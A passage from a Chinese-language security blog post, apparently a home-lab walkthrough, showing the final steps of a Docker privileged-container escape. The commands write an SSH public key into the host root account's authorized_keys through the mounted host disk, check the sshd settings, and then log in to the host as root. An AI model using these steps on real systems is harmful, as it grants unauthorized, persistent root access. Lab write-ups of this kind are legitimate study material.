+<h3 id="在特权容器中，将公钥写入宿主机-root-账户"><a href="#在特权容器中，将公钥写入宿主机-root-账户" class="headerlink" title="在特权容器中，将公钥写入宿主机 root 账户"></a>在特权容器中，将公钥写入宿主机 root 账户</h3><p>宿主机磁盘挂载在 <code>/teach</code>，所以宿主机 root 的授权文件对应：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/teach/root/.ssh/authorized_keys</span><br></pre></td></tr></tbody></table></figure>
+
+<p>先备份并创建目录：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mkdir -p /teach/root/.ssh</span><br><span class="line">cp -a /teach/root/.ssh/authorized_keys \</span><br><span class="line">  /teach/root/.ssh/authorized_keys.bak 2&gt;/dev/null || true</span><br><span class="line"></span><br><span class="line">chmod 700 /teach/root/.ssh</span><br><span class="line">touch /teach/root/.ssh/authorized_keys</span><br><span class="line">chmod 600 /teach/root/.ssh/authorized_keys</span><br><span class="line">chown -R 0:0 /teach/root/.ssh</span><br></pre></td></tr></tbody></table></figure>
+
+<p>然后将刚才 web1 上显示的公钥完整一行追加进去：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAINTmqwPMuw+43xIKVqcPgtinpIVj1SJ8H37Kn+8/yegK' &gt;&gt; /teach/root/.ssh/authorized_keys</span><br></pre></td></tr></tbody></table></figure>
+
+<p>在容器里查看宿主机 SSH 配置：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">grep -RniE '^(PermitRootLogin|PubkeyAuthentication|AuthorizedKeysFile)' \</span><br><span class="line">  /teach/etc/ssh/sshd_config \</span><br><span class="line">  /teach/etc/ssh/sshd_config.d 2&gt;/dev/null</span><br></pre></td></tr></tbody></table></figure>
+
+<p><img src="https://xiubidawang.oss-cn-beijing.aliyuncs.com/img/20260715173940473.png" alt="image-20260715173940300"></p>
+<p>可以使用密钥登录</p>
+<p>设置所有者：</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chown -R 0:0 /teach/root/.ssh</span><br><span class="line">sync</span><br></pre></td></tr></tbody></table></figure>
+
+<h3 id="回到-web1，用私钥连接宿主机"><a href="#回到-web1，用私钥连接宿主机" class="headerlink" title="回到 web1，用私钥连接宿主机"></a>回到 web1，用私钥连接宿主机</h3><figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 600 /root/teach</span><br><span class="line">ssh -i /root/teach -o IdentitiesOnly=yes root@192.168.111.128</span><br></pre></td></tr></tbody></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io">xiubi</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://xiubi1125.github.io/2026/07/16/%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C/">https://xiubi1125.github.io/2026/07/16/%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://xiubi1125.github.io" target="_blank">休比大王</a>！</span></div></div><div class="tag_share"><div class="post-share"><div class="social-share" data-image="/img/tx.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer=""></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2026/04/12/webmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="2026长城杯AWDP半决赛"><img class="cover" src="/img/ccb.jpg" onerror="onerror=null;src='/img/yu.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">2026长城杯AWDP半决赛</div></div><div class="info-2"><div class="info-item-1">ZZZZZZZZZZZZZZZZZZZZZZZ
+</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="avatar"></div><div class="author-info-name">xiubi</div><div class="author-info-description">或许最低落笔峰都能与光相逢</div><div class="site-data"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">小小的不如意是在为大大的幸福做铺垫ദ്ദി˶ᕑᗢᓫ)✧</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C"><span class="toc-number">1.</span> <span class="toc-text">渗透世界</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#ubuntu2"><span class="toc-number">1.1.1.</span> <span class="toc-text">ubuntu2</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#pc1"><span class="toc-number">1.1.2.</span> <span class="toc-text">pc1</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1"><span class="toc-number">1.2.</span> <span class="toc-text">1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#docker%E9%80%83%E9%80%B8"><span class="toc-number">1.3.</span> <span class="toc-text">docker逃逸</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-dockerenv"><span class="toc-number">1.3.1.</span> <span class="toc-text">1  .dockerenv</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-proc-1-cgroup"><span class="toc-number">1.3.2.</span> <span class="toc-text">2    /proc/1/cgroup</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-container-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">1.3.3.</span> <span class="toc-text">3  container 环境变量</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">1.3.4.</span> <span class="toc-text">原理</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%80%83"><span class="toc-number">1.4.</span> <span class="toc-text">逃</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8-web1-%E4%B8%8A%E7%94%9F%E6%88%90-SSH-%E5%AF%86%E9%92%A5"><span class="toc-number">1.4.1.</span> <span class="toc-text">在 web1 上生成 SSH 密钥</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9C%A8%E7%89%B9%E6%9D%83%E5%AE%B9%E5%99%A8%E4%B8%AD%EF%BC%8C%E5%B0%86%E5%85%AC%E9%92%A5%E5%86%99%E5%85%A5%E5%AE%BF%E4%B8%BB%E6%9C%BA-root-%E8%B4%A6%E6%88%B7"><span class="toc-number">1.4.2.</span> <span class="toc-text">在特权容器中，将公钥写入宿主机 root 账户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9E%E5%88%B0-web1%EF%BC%8C%E7%94%A8%E7%A7%81%E9%92%A5%E8%BF%9E%E6%8E%A5%E5%AE%BF%E4%B8%BB%E6%9C%BA"><span class="toc-number">1.4.3.</span> <span class="toc-text">回到 web1，用私钥连接宿主机</span></a></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/07/16/%E6%B8%97%E9%80%8F%E4%B8%96%E7%95%8C/" title="无标题">无标题</a><time datetime="2026-07-16T06:37:21.990Z" title="发表于 2026-07-16 14:37:21">2026-07-16</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/04/12/webmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="2026长城杯AWDP半决赛"><img src="/img/ccb.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="2026长城杯AWDP半决赛"></a><div class="content"><a class="title" href="/2026/04/12/webmin%E6%9C%AA%E6%8E%88%E6%9D%83%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" title="2026长城杯AWDP半决赛">2026长城杯AWDP半决赛</a><time datetime="2026-04-12T07:35:38.802Z" title="发表于 2026-04-12 15:35:38">2026-04-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/12/Java-%E5%8F%8D%E5%B0%84%E5%8F%8A%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java-反射及原生序列化和反序列化"><img src="/img/java1.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="Java-反射及原生序列化和反序列化"></a><div class="content"><a class="title" href="/2026/03/12/Java-%E5%8F%8D%E5%B0%84%E5%8F%8A%E5%8E%9F%E7%94%9F%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Java-反射及原生序列化和反序列化">Java-反射及原生序列化和反序列化</a><time datetime="2026-03-12T02:21:46.275Z" title="发表于 2026-03-12 10:21:46">2026-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/03/11/vue%E5%9F%BA%E7%A1%80/" title="vue2基础"><img src="/img/vue2.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="vue2基础"></a><div class="content"><a class="title" href="/2026/03/11/vue%E5%9F%BA%E7%A1%80/" title="vue2基础">vue2基础</a><time datetime="2026-03-10T16:00:00.000Z" title="发表于 2026-03-11 00:00:00">2026-03-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/13/SpringBoot/" title="SpringBoot"><img src="/img/spring.jpg" onerror="this.onerror=null;this.src='/img/yu.jpg'" alt="SpringBoot"></a><div class="content"><a class="title" href="/2026/02/13/SpringBoot/" title="SpringBoot">SpringBoot</a><time datetime="2026-02-13T03:16:22.442Z" title="发表于 2026-02-13 11:16:22">2026-02-13</time></div></div></div></div></div></div></main><footer id="footer" style="background: transparent;"><div id="footer-wrap"><div class="copyright">©2019 - 2026 By xiubi</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 7.3.0</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.3.5</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="日间和夜间模式切换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><canvas id="snow"></canvas><script src="/js/font.js</script)<script"></script><script src="/js/jquery.js"></script><script async="" src="/js/title.js"></script><meting-js class="no-destroy" id="14171279957" server="netease" type="playlist" fixed="true" autoplay="true" order="random" volume="0.3" list-folded="false" list-max-height="36vh"> </meting-js><canvas class="fireworks" mobile="false"></canvas><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/fireworks.min.js"></script><link rel="stylesheet" href="https://npm.elemecdn.com/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://npm.elemecdn.com/aplayer/dist/APlayer.min.js"></script><script src="https://npm.elemecdn.com/meting/dist/Meting.min.js"></script><script>(() => {
+  const destroyAplayer = () => {
+    if (window.aplayers) {
+      for (let i = 0; i < window.aplayers.length; i++) {
+        if (!window.aplayers[i].options.fixed) {
+          window.aplayers[i].destroy()
+        }
+      }
+    }
+  }
+
+  const runMetingJS = () => {
+    typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()
+  }
+
+  btf.addGlobalFn('pjaxSend', destroyAplayer, 'destroyAplayer')
+  btf.addGlobalFn('pjaxComplete', loadMeting, 'runMetingJS')
+})()</script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>(() => {
+  const pjaxSelectors = ["head > title","#config-diff","#body-wrap","#rightside-config-hide","#rightside-config-show",".js-pjax"]
+
+  window.pjax = new Pjax({
+    elements: 'a:not([target="_blank"])',
+    selectors: pjaxSelectors,
+    cacheBust: false,
+    analytics: false,
+    scrollRestoration: false
+  })
+
+  const triggerPjaxFn = (val) => {
+    if (!val) return
+    Object.values(val).forEach(fn => fn())
+  }
+
+  document.addEventListener('pjax:send', () => {
+    // removeEventListener
+    btf.removeGlobalFnEvent('pjaxSendOnce')
+    btf.removeGlobalFnEvent('themeChange')
+
+    // reset readmode
+    const $bodyClassList = document.body.classList
+    if ($bodyClassList.contains('read-mode')) $bodyClassList.remove('read-mode')
+
+    triggerPjaxFn(window.globalFn.pjaxSend)
+  })
+
+  document.addEventListener('pjax:complete', () => {
+    btf.removeGlobalFnEvent('pjaxCompleteOnce')
+    document.querySelectorAll('script[data-pjax]').forEach(item => {
+      const newScript = document.createElement('script')
+      const content = item.text || item.textContent || item.innerHTML || ""
+      Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+      newScript.appendChild(document.createTextNode(content))
+      item.parentNode.replaceChild(newScript, item)
+    })
+
+    triggerPjaxFn(window.globalFn.pjaxComplete)
+  })
+
+  document.addEventListener('pjax:error', e => {
+    if (e.request.status === 404) {
+      const usePjax = true
+      false 
+        ? (usePjax ? pjax.loadUrl('/404.html') : window.location.href = '/404.html')
+        : window.location.href = e.request.responseURL
+    }
+  })
+})()</script><script async="" data-pjax="" src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax="">
+    function butterfly_categories_card_injector_config(){
+      var parent_div_git = document.getElementById('recent-posts');
+      var item_html = '<style>li.categoryBar-list-item{width:32.3%;}.categoryBar-list{max-height: 190px;overflow:auto;}.categoryBar-list::-webkit-scrollbar{width:0!important}@media screen and (max-width: 650px){.categoryBar-list{max-height: 160px;}}</style><div class="recent-post-item" style="height:auto;width:100%;padding:0px;"><div id="categoryBar"><ul class="categoryBar-list"><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/一些复现/&quot;);" href="javascript:void(0);">一些复现</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">被虐的那些年</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/jaaaavvvvaaaa/&quot;);" href="javascript:void(0);">jaaaavvvvaaaa</a><span class="categoryBar-list-count">2</span><span class="categoryBar-list-descr">比较碎的一些点</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/乱七八糟/&quot;);" href="javascript:void(0);">乱七八糟</a><span class="categoryBar-list-count">6</span><span class="categoryBar-list-descr">top10学习日记</span></li><li class="categoryBar-list-item" style="background:url(https://xiubi1125.github.io/img/ssti.jpg);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/靶场系列/&quot;);" href="javascript:void(0);">靶场系列</a><span class="categoryBar-list-count">4</span><span class="categoryBar-list-descr">谁给我作业放这了</span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/属于蓝雨的夏天/&quot;);" href="javascript:void(0);">属于蓝雨的夏天</a><span class="categoryBar-list-count">5</span><span class="categoryBar-list-descr"></span></li><li class="categoryBar-list-item" style="background:url(undefined);"> <a class="categoryBar-list-link" onclick="pjax.loadUrl(&quot;categories/jvvvvaaaavvvv/&quot;);" href="javascript:void(0);">jvvvvaaaavvvv</a><span class="categoryBar-list-count">1</span><span class="categoryBar-list-descr"></span></li></ul></div></div>';
+      console.log('已挂载butterfly_categories_card')
+      parent_div_git.insertAdjacentHTML("afterbegin",item_html)
+      }
+    if( document.getElementById('recent-posts') && (location.pathname ==='/'|| '/' ==='all')){
+    butterfly_categories_card_injector_config()
+    }
+  </script><!-- hexo injector body_end end --></body></html>
